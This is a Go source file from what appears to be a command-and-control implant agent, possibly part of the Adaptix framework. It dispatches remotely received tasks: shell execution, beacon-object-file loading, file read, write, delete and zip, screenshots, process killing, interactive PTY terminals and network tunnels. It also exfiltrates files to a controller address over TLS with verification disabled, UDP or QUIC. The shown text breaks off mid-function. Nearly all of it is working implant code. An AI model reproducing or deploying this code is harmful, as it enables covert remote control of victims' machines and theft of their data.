package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"errors"
	"fmt"
	"gopher/bof/coffer"
	"gopher/functions"
	"gopher/utils"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/quic-go/quic-go"
	"github.com/vmihailenco/msgpack/v5"
)

var UPLOADS map[string][]byte
var DOWNLOADS map[string]utils.Connection
var JOBS map[string]utils.Connection
var TUNNELS sync.Map
var TERMINALS sync.Map

func TaskProcess(commands [][]byte) [][]byte {
	var (
		command utils.Command
		data    []byte
		result  [][]byte
		err     error
	)

	for _, cmdBytes := range commands {
		err = msgpack.Unmarshal(cmdBytes, &command)
		if err != nil {
			continue
		}

		switch command.Code {

		case utils.COMMAND_DOWNLOAD:
			data, err = jobDownloadStart(command.Data)

		case utils.COMMAND_CAT:
			data, err = taskCat(command.Data)

		case utils.COMMAND_CD:
			data, err = taskCd(command.Data)

		case utils.COMMAND_CP:
			data, err = taskCp(command.Data)

		case utils.COMMAND_EXEC_BOF:
			data, err = taskExecBof(command.Data)

		case utils.COMMAND_EXIT:
			data, err = taskExit()

		case utils.COMMAND_JOB_LIST:
			data, err = taskJobList()

		case utils.COMMAND_JOB_KILL:
			data, err = taskJobKill(command.Data)

		case utils.COMMAND_KILL:
			data, err = taskKill(command.Data)

		case utils.COMMAND_LS:
			data, err = taskLs(command.Data)

		case utils.COMMAND_MKDIR:
			data, err = taskMkdir(command.Data)

		case utils.COMMAND_MV:
			data, err = taskMv(command.Data)

		case utils.COMMAND_PS:
			data, err = taskPs()

		case utils.COMMAND_PWD:
			data, err = taskPwd()

		case utils.COMMAND_REV2SELF:
			data, err = taskRev2Self()

		case utils.COMMAND_RM:
			data, err = taskRm(command.Data)

		case utils.COMMAND_RUN:
			data, err = jobRun(command.Data)

		case utils.COMMAND_SHELL:
			data, err = taskShell(command.Data)

		case utils.COMMAND_SCREENSHOT:
			data, err = taskScreenshot()

		case utils.COMMAND_TERMINAL_START:
			jobTerminal(command.Data)

		case utils.COMMAND_TERMINAL_STOP:
			taskTerminalKill(command.Data)

		case utils.COMMAND_TUNNEL_START:
			jobTunnel(command.Data)

		case utils.COMMAND_TUNNEL_STOP:
			taskTunnelKill(command.Data)

		case utils.COMMAND_UPLOAD:
			data, err = taskUpload(command.Data)

		case utils.COMMAND_ZIP:
			data, err = taskZip(command.Data)

		case utils.COMMAND_SLEEP:
			data, err = taskSleep(command.Data)

		default:
			continue
		}

		if err != nil {
			command.Code = utils.COMMAND_ERROR
			command.Data, _ = msgpack.Marshal(utils.AnsError{Error: err.Error()})
		} else {
			command.Data = data
		}

		packerData, _ := msgpack.Marshal(command)
		result = append(result, packerData)
	}

	return result
}

/// TASKS

func taskCat(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCat
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	fileInfo, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if fileInfo.Size() > 0x100000 {
		return nil, fmt.Errorf("file size exceeds 1 Mb (use download)")
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsCat{Path: params.Path, Content: content})
}

func taskCd(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCd
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	err = os.Chdir(path)
	if err != nil {
		return nil, err
	}

	newPath, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: newPath})
}

func taskCp(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCp
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
	}

	return nil, err
}

func taskExecBof(paramsData []byte) ([]byte, error) {
	var params utils.ParamsExecBof
	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
		return nil, err
	}

	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
	if err != nil {
		args = make([]byte, 1)
	}

	msgs, err := coffer.Load(params.Object, args)
	if err != nil {
		return nil, err
	}

	list, _ := msgpack.Marshal(msgs)

	return msgpack.Marshal(utils.AnsExecBof{Msgs: list})
}

func taskExit() ([]byte, error) {
	ACTIVE = false
	return nil, nil
}

func taskJobList() ([]byte, error) {

	var jobList []utils.JobInfo
	for k, v := range DOWNLOADS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}
	for k, v := range JOBS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}

	list, _ := msgpack.Marshal(jobList)

	return msgpack.Marshal(utils.AnsJobList{List: list})
}

func taskJobKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsJobKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	job, ok := DOWNLOADS[params.Id]
	if !ok {
		job, ok = JOBS[params.Id]
		if !ok {
			return nil, fmt.Errorf("job '%s' not found", params.Id)
		}
	}

	if job.JobCancel != nil {
		job.JobCancel()
	}

	job.HandleCancel()

	return nil, nil
}

func taskKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	proc, err := os.FindProcess(params.Pid)
	if err != nil {
		return nil, err
	}

	err = proc.Signal(syscall.SIGKILL)
	return nil, err
}

func taskLs(paramsData []byte) ([]byte, error) {
	var params utils.ParamsLs
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	Files, err := functions.GetListing(path)
	if err != nil {
		return msgpack.Marshal(utils.AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
	}

	filesData, _ := msgpack.Marshal(Files)

	return msgpack.Marshal(utils.AnsLs{Result: true, Path: path, Files: filesData})
}

func taskMkdir(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMkdir
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	mode := os.FileMode(0755)
	err = os.MkdirAll(path, mode)

	return nil, err
}

func taskMv(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMv
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	err = os.Rename(srcPath, dstPath)
	if err == nil {
		return nil, nil
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
		if err == nil {
			_ = os.RemoveAll(srcPath)
		}
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
		if err == nil {
			_ = os.Remove(srcPath)
		}
	}
	return nil, err
}

func taskPs() ([]byte, error) {
	Processes, err := functions.GetProcesses()
	if err != nil {
		return nil, err
	}

	processesData, _ := msgpack.Marshal(Processes)

	return msgpack.Marshal(utils.AnsPs{Result: true, Processes: processesData})
}

func taskPwd() ([]byte, error) {
	path, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: path})
}

func taskRev2Self() ([]byte, error) {
	functions.Rev2Self()
	return nil, nil
}

func taskRm(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRm
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if info.IsDir() {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}
	return nil, err
}

func taskScreenshot() ([]byte, error) {
	screenshot, err := functions.Screenshots()
	if err != nil {
		return nil, err
	}

	screens := make([][]byte, 0)
	for _, pic := range screenshot {
		screens = append(screens, pic)
	}

	return msgpack.Marshal(utils.AnsScreenshots{Screens: screens})
}

func taskShell(paramsData []byte) ([]byte, error) {
	var params utils.ParamsShell
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	cmd := exec.Command(params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	output, _ := cmd.CombinedOutput()

	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
}

func taskTerminalKill(paramsData []byte) {
	var params utils.ParamsTerminalStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TERMINALS.Load(params.TermId)
	if ok {
		cancel, ok := value.(context.CancelFunc)
		if ok {
			cancel()
		}
	}
}

func taskTunnelKill(paramsData []byte) {
	var params utils.ParamsTunnelStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		cancel, ok := value.(context.CancelFunc)
		if ok {
			cancel()
		}
	}
}

func taskUpload(paramsData []byte) ([]byte, error) {
	var params utils.ParamsUpload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	uploadBytes, ok := UPLOADS[path]
	if !ok {
		uploadBytes = params.Content
	} else {
		delete(UPLOADS, path)
		uploadBytes = append(uploadBytes, params.Content...)
	}

	if params.Finish {
		files, err := functions.UnzipBytes(uploadBytes)
		if err != nil {
			return nil, err
		}

		content, ok := files[params.Path]
		if !ok {
			return nil, errors.New("file not uploaded")
		}

		err = os.WriteFile(path, content, 0644)
		if err != nil {
			return nil, err
		}

	} else {
		UPLOADS[path] = uploadBytes
		return nil, nil
	}

	return msgpack.Marshal(utils.AnsUpload{Path: path})
}

func taskZip(paramsData []byte) ([]byte, error) {
	var params utils.ParamsZip
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(srcPath)
	} else {
		content, err = functions.ZipFile(srcPath)
	}
	if err != nil {
		return nil, err
	}

	err = os.WriteFile(dstPath, content, 0644)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsZip{Path: dstPath})
}

/// JOBS

func jobDownloadStart(paramsData []byte) ([]byte, error) {
	var params utils.ParamsDownload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	size := info.Size() // тип int64

	if size > 4*1024*1024*1024 {
		return nil, errors.New("file too big (>4GB)")
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(path)
		path += ".zip"
	} else {
		content, err = os.ReadFile(path)
	}
	if err != nil {
		return nil, err
	}

	var conn net.Conn
	if profile.Protocol == "udp" {
		// UDP connection
		udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
		if err != nil {
			return nil, err
		}
		conn, err = net.DialUDP("udp", nil, udpAddr)
	} else if profile.UseSSL {
		// TCP with SSL/TLS
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		// TCP without SSL
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		return nil, err
	}

	strFileId := params.Task
	FileId, _ := strconv.ParseInt(strFileId, 16, 64)

	connection := utils.Connection{
		PackType: utils.EXFIL_PACK,
		Conn:     conn,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	DOWNLOADS[strFileId] = connection

	go func() {
		defer func() {
			connection.HandleCancel()
			_ = conn.Close()
			delete(DOWNLOADS, strFileId)
		}()

		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		exfilMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.EXFIL_PACK, Data: exfilPack})
		exfilMsg, _ = utils.EncryptData(exfilMsg, encKey)

		job := utils.Job{
			CommandId: utils.COMMAND_DOWNLOAD,
			JobId:     params.Task,
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, exfilMsg)

		chunkSize := 0x100000 // 1MB
		totalSize := len(content)
		for i := 0; i < totalSize; i += chunkSize {

			end := i + chunkSize
			if end > totalSize {
				end = totalSize
			}
			start := i == 0
			finish := end == totalSize

			canceled := false

			select {
			case <-connection.Ctx.Done():
				finish = true
				canceled = true
			default:
				// Continue
			}

			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
			packedJob, _ := msgpack.Marshal(job)

			message := utils.Message{
				Type:   2,
				Object: [][]byte{packedJob},
			}

			sendData, _ := msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			_ = functions.SendMsg(conn, sendData)

			if finish {
				break
			}
			time.Sleep(time.Millisecond * 100)
		}
	}()

	return nil, nil
}

func jobRun(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRun
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	procCtx, procCancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(procCtx, params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stdout pipe error: %w", err)
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stderr pipe error: %w", err)
	}

	var stdoutMu sync.Mutex
	var stderrMu sync.Mutex
	stdoutBuf := new(bytes.Buffer)
	stderrBuf := new(bytes.Buffer)

	err = cmd.Start()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("start error: %w", err)
	}
	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	var conn net.Conn
	if profile.Protocol == "udp" {
		// UDP connection
		udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
		if err != nil {
			procCancel()
			return nil, err
		}
		conn, err = net.DialUDP("udp", nil, udpAddr)
	} else if profile.UseSSL {
		// TCP with SSL/TLS
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			procCancel()
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		procCancel()
		return nil, err
	}

	connection := utils.Connection{
		PackType:  utils.JOB_PACK,
		Conn:      conn,
		JobCancel: procCancel,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	JOBS[params.Task] = connection

	go func() {
		defer func() {
			procCancel()
			connection.HandleCancel()
			_ = conn.Close()
			delete(JOBS, params.Task)
		}()

		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		functions.SendMsg(conn, jobMsg)

		job := utils.Job{
			CommandId: utils.COMMAND_RUN,
			JobId:     params.Task,
		}

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Start: true})
		packedJob, _ := msgpack.Marshal(job)

		message := utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ := msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			buf := make([]byte, 2*1024)
			for {
				n, err := stdoutPipe.Read(buf)
				if n > 0 {
					stdoutMu.Lock()
					stdoutBuf.Write(buf[:n])
					stdoutMu.Unlock()
				}
				if err == io.EOF {
					break
				}
				if err != nil {
					break
				}
			}
		}()
		go func() {
			defer wg.Done()
			buf := make([]byte, 2*1024)
			for {
				n, err := stderrPipe.Read(buf)
				if n > 0 {
					stderrMu.Lock()
					stderrBuf.Write(buf[:n])
					stderrMu.Unlock()
				}
				if err == io.EOF {
					break
				}
				if err != nil {
					break
				}
			}
		}()

		done := make(chan struct{})

		const maxChunkSize = 0x10000 // 65 Kb
		go func() {
			ticker := time.NewTicker(1 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					return

				case <-ticker.C:
					// Drain Stdout
					stdoutMu.Lock()
					outStr := stdoutBuf.String()
					stdoutBuf.Reset()
					stdoutMu.Unlock()

					// Drain Stderr
					stderrMu.Lock()
					errStr := stderrBuf.String()
					stderrBuf.Reset()
					stderrMu.Unlock()
					
					// Send Stdout in chunks
					for len(outStr) > 0 {
						chunkSize := maxChunkSize
						if len(outStr) < chunkSize {
							chunkSize = len(outStr)
						}
						
						ansRun := utils.AnsRun{Pid: pid, Stdout: outStr[:chunkSize]}
						outStr = outStr[chunkSize:]
						
						job.Data, _ = msgpack.Marshal(ansRun)
						packedJob, _ := msgpack.Marshal(job)
						message := utils.Message{Type: 2, Object: [][]byte{packedJob}}
						sendData, _ := msgpack.Marshal(message)
						sendData, _ = utils.EncryptData(sendData, utils.SKey)
						if err := functions.SendMsg(conn, sendData); err != nil {
							return
						}
						// Small sleep to prevent flooding
						time.Sleep(10 * time.Millisecond)
					}

					// Send Stderr in chunks
					for len(errStr) > 0 {
						chunkSize := maxChunkSize
						if len(errStr) < chunkSize {
							chunkSize = len(errStr)
						}
						
						ansRun := utils.AnsRun{Pid: pid, Stderr: errStr[:chunkSize]}
						errStr = errStr[chunkSize:]
						
						job.Data, _ = msgpack.Marshal(ansRun)
						packedJob, _ := msgpack.Marshal(job)
						message := utils.Message{Type: 2, Object: [][]byte{packedJob}}
						sendData, _ = msgpack.Marshal(message)
						sendData, _ = utils.EncryptData(sendData, utils.SKey)
						if err := functions.SendMsg(conn, sendData); err != nil {
							return
						}
						time.Sleep(10 * time.Millisecond)
					}
				}
			}
		}()

		time.Sleep(200 * time.Millisecond)
		err = cmd.Wait()
		wg.Wait()
		close(done)

		// Final drain
		stdoutMu.Lock()
		finalOut := stdoutBuf.String()
		stdoutBuf.Reset()
		stdoutMu.Unlock()
		
		stderrMu.Lock()
		finalErrOut := stderrBuf.String()
		stderrBuf.Reset()
		stderrMu.Unlock()

		// Send final Stdout
		for len(finalOut) > 0 {
			chunkSize := maxChunkSize
			if len(finalOut) < chunkSize {
				chunkSize = len(finalOut)
			}
			ansRun := utils.AnsRun{Pid: pid, Stdout: finalOut[:chunkSize]}
			finalOut = finalOut[chunkSize:]
			
			job.Data, _ = msgpack.Marshal(ansRun)
			packedJob, _ = msgpack.Marshal(job)
			message = utils.Message{Type: 2, Object: [][]byte{packedJob}}
			sendData, _ = msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			functions.SendMsg(conn, sendData)
			time.Sleep(10 * time.Millisecond)
		}

		// Send final Stderr
		for len(finalErrOut) > 0 {
			chunkSize := maxChunkSize
			if len(finalErrOut) < chunkSize {
				chunkSize = len(finalErrOut)
			}
			ansRun := utils.AnsRun{Pid: pid, Stderr: finalErrOut[:chunkSize]}
			finalErrOut = finalErrOut[chunkSize:]
			
			job.Data, _ = msgpack.Marshal(ansRun)
			packedJob, _ = msgpack.Marshal(job)
			message = utils.Message{Type: 2, Object: [][]byte{packedJob}}
			sendData, _ = msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			functions.SendMsg(conn, sendData)
			time.Sleep(10 * time.Millisecond)
		}

		/// FINISH

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Finish: true})
		packedJob, _ = msgpack.Marshal(job)

		message = utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ = msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)
	}()

	return nil, nil
}

func jobTunnel(paramsData []byte) {
	var params utils.ParamsTunnelStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		reason := byte(0)
		clientConn, err := net.DialTimeout(params.Proto, params.Address, 200*time.Millisecond)
		if err != nil {
			active = false
			var opErr *net.OpError
			if errors.As(err, &opErr) {
				if opErr.Timeout() {
					reason = 4
				}
				if errors.Is(syscall.ECONNREFUSED, opErr.Err) {
					reason = 5
				}
				if errors.Is(syscall.ENETUNREACH, opErr.Err) {
					reason = 3
				}
			}
		}

		var srvConn net.Conn
		if profile.Protocol == "udp" {
			// UDP connection
			udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
			if err != nil {
				return
			}
			srvConn, err = net.DialUDP("udp", nil, udpAddr)
		} else if profile.UseSSL {
			// TCP with SSL/TLS
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)

		} else {
			// TCP without SSL
			srvConn, err = net.Dial("tcp", profile.Addresses[0])
		}
		if err != nil {
			if srvConn != nil {
				srvConn.Close()
			}
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TUNNEL, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				return
			}
		}

		/// Send Init
		functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

		// Stateless Encryption for Tunnel
		encCipher, _ := aes.NewCipher(tunKey)
		decCipher, _ := aes.NewCipher(tunKey)
		
		// Fallback for TCP
		streamWriter := &cipher.StreamWriter{S: cipher.NewCTR(encCipher, tunIv), W: srvConn}
		streamReader := &cipher.StreamReader{S: cipher.NewCTR(decCipher, tunIv), R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		TUNNELS.Store(params.ChannelId, cancel)
		defer TUNNELS.Delete(params.ChannelId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = clientConn.Close()
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			if profile.Protocol == "quic" {
				// Framed Reader for QUIC: Conn -> Client
				for {
					encData, err := functions.RecvMsg(srvConn)
					if err != nil {
						break
					}
					if len(encData) > 0 {
						// Stateless Decrypt
						decData := make([]byte, len(encData))
						localDecStream := cipher.NewCTR(decCipher, tunIv)
						localDecStream.XORKeyStream(decData, encData)

						_, err = clientConn.Write(decData)
						if err != nil {
							fmt.Printf("[DEBUG] Tunnel Client Write Error: %v\n", err)
							break
						}
					}
				}
			} else {
				io.Copy(clientConn, streamReader)
			}
			closeAll()
		}()

		go func() {
			defer wg.Done()
			if profile.Protocol == "quic" {
				// Framed Writer for QUIC: Client -> Conn
				buf := make([]byte, 4096)
				for {
					n, err := clientConn.Read(buf)
					if n > 0 {
						encData := make([]byte, n)
						// Stateless Encrypt
						localEncStream := cipher.NewCTR(encCipher, tunIv)
						localEncStream.XORKeyStream(encData, buf[:n])

						tunPack := utils.TunnelPack{Id: uint(AgentId), ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: true, Data: encData}
						tpData, _ := msgpack.Marshal(tunPack)

						startMsg := utils.StartMsg{Type: utils.JOB_TUNNEL, Data: tpData}
						smData, _ := msgpack.Marshal(startMsg)
						
						// Encrypt with Session Key
						finalData, _ := utils.EncryptData(smData, encKey)

						err = functions.SendMsg(srvConn, finalData)
						if err != nil {
							break
						}
					}
					if err != nil {
						if err != io.EOF {
							fmt.Printf("[DEBUG] Tunnel Client Read Error: %v\n", err)
						}
						break
					}
				}
			} else {
				io.Copy(streamWriter, clientConn)
			}
			closeAll()
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()

		cancel()
	}()
}

func jobTerminal(paramsData []byte) {
	var params utils.ParamsTerminalStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		status := ""

		args := []string{}
		if strings.HasSuffix(params.Program, "sh") {
			args = append(args, "-i")
		}
		process := exec.Command(params.Program, args...)
		ptyProc, err := functions.StartPtyCommand(process, uint16(params.Width), uint16(params.Height))
		if err != nil {
			active = false
			status = err.Error()
		}

		var srvConn net.Conn
		if profile.Protocol == "quic" {
			tlsConf := &tls.Config{
				InsecureSkipVerify: true,
				NextProtos:         []string{"adaptix-quic"},
				MinVersion:         tls.VersionTLS12,
			}
			quicConf := &quic.Config{
				MaxIdleTimeout:       30 * time.Second,
				KeepAlivePeriod:      30 * time.Second,
				HandshakeIdleTimeout: 30 * time.Second,
			}
			session, err := quic.DialAddr(context.Background(), profile.Addresses[0], tlsConf, quicConf)
			if err == nil {
				stream, err := session.OpenStreamSync(context.Background())
				if err == nil {
					srvConn = &functions.QUICStreamConn{Stream: stream, Session: session}
				} else {
					session.CloseWithError(0, "failed to open stream")
					err = errors.New("failed to open stream")
				}
			}
		} else if profile.Protocol == "udp" {
			// UDP connection
			udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
			if err != nil {
				return
			}
			srvConn, err = net.DialUDP("udp", nil, udpAddr)
		} else if profile.UseSSL {
			// TCP with SSL/TLS
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)

		} else {
			// TCP without SSL
			srvConn, err = net.Dial("tcp", profile.Addresses[0])
		}
		if err != nil {
			if active {
				functions.StopPty(ptyProc)
				_ = process.Process.Kill()
			}
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TERMINAL, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				if active {
					functions.StopPty(ptyProc)
					_ = process.Process.Kill()
				}
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

		// Stateless Encryption: Stream ciphers created per-packet to match Server logic
		encCipher, _ := aes.NewCipher(tunKey)
		decCipher, _ := aes.NewCipher(tunKey)
		
		// streamWriter/Reader only for TCP/TLS fallback
		// For QUIC, we use manual XOR per packet
		streamWriter := &cipher.StreamWriter{S: cipher.NewCTR(encCipher, tunIv), W: srvConn}
		streamReader := &cipher.StreamReader{S: cipher.NewCTR(decCipher, tunIv), R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		TERMINALS.Store(params.TermId, cancel)
		defer TERMINALS.Delete(params.TermId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				time.Sleep(200 * time.Millisecond)
				_ = functions.StopPty(ptyProc)
				if functions.IsProcessRunning(process) {
